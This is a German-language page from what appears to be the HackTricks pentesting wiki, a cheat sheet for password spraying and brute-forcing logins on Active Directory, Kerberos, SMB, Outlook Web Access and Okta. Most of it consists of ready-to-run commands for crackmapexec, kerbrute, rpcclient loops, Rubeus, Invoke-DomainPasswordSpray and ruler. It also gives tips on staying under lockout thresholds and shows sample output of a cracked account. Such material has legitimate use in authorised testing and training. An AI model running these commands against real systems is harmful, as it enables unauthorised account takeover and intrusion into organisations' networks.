# Passwort-Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}

## **Passwort-Spraying**

Sobald Sie mehrere **gültige Benutzernamen** gefunden haben, können Sie die häufigsten **Passwörter** ausprobieren (denken Sie an die Passwort-Richtlinie der Umgebung) mit jedem der entdeckten Benutzer.\
Standardmäßig beträgt die **minimale** **Passwort** **länge** **7**.

Listen mit häufigen Benutzernamen könnten ebenfalls nützlich sein: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Beachten Sie, dass Sie **einige Konten sperren könnten, wenn Sie mehrere falsche Passwörter ausprobieren** (standardmäßig mehr als 10).

### Passwort-Richtlinie abrufen

Wenn Sie einige Benutzeranmeldeinformationen oder eine Shell als Domänenbenutzer haben, können Sie **die Passwort-Richtlinie mit**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Ausnutzung von Linux (oder allen)

- Verwendung von **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Verwendung von [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(Sie können die Anzahl der Versuche angeben, um Sperrungen zu vermeiden):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Verwendung von [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (Python) - NICHT EMPFOHLEN, FUNKTIONIERT MANCHMAL NICHT
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Mit dem `scanner/smb/smb_login` Modul von **Metasploit**:

![](<../../images/image (745).png>)

- Verwendung von **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Von Windows

- Mit der [Rubeus](https://github.com/Zer1t0/Rubeus) Version mit Brute-Modul:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Mit [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Es kann standardmäßig Benutzer aus der Domäne generieren und es wird die Passwortpolitik der Domäne abrufen und die Versuche entsprechend einschränken):
```powershell
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Mit [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
## Outlook Web Access

Es gibt mehrere Tools für p**assword spraying outlook**.

- Mit [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- mit [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Mit [Ruler](https://github.com/sensepost/ruler) (zuverlässig!)
- Mit [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Mit [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Um eines dieser Tools zu verwenden, benötigen Sie eine Benutzerliste und ein Passwort / eine kleine Liste von Passwörtern zum Sprühen.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Referenzen

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)


{{#include ../../banners/hacktricks-training.md}}
